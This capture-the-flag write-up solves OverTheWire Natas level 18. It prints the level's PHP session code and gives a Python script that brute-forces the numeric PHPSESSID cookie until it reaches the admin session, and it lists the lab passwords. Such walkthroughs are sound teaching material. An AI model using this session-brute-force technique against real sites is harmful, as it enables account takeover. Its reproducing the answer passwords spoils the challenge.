# Level 18

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)
- username: `natas18`
- password: `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`

## Solution

![start](./start.jpg)

Let's see the sourcecode:

```php
...
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
...
```

So it checks our `PHPSESSID` cookie. And we know that admin's cookie is in range `0-640`, we can bruteforce it by requesting the page with all possible cookie values and if `You are an admin` is in response text, then we got the right cookie. We can solve it with python:

```py
import requests

# Base URL
url = 'http://natas18.natas.labs.overthewire.org/'

# Function to make a POST request with a specific PHPSESSID
def send_post_with_session_id(session_id):
    # Cookies dictionary
    cookies = {'PHPSESSID': str(session_id)}
    
    # Headers including content type
    headers = {
        'Authorization': 'Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas17.natas.labs.overthewire.org',
        'Referer': 'http://natas17.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Data payload for the POST request
    data = {'username': 'a'} 

    # Make the POST request with the specified session ID
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    
    if "You are an admin" in response.text:
        print("Admin's PHPSESSID is " + str(session_id))
        return True

# Loop through session IDs from 1 to 640
for session_id in range(1, 641):
    if send_post_with_session_id(session_id):
        break
```

The output is: `Admin's PHPSESSID is 119`, so by setting our `PHPSESSID` to `119` we can see following page:

![pass](./pass.jpg)

## Password

`natas19`:`8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s`

*Created by [bu19akov](https://github.com/bu19akov)*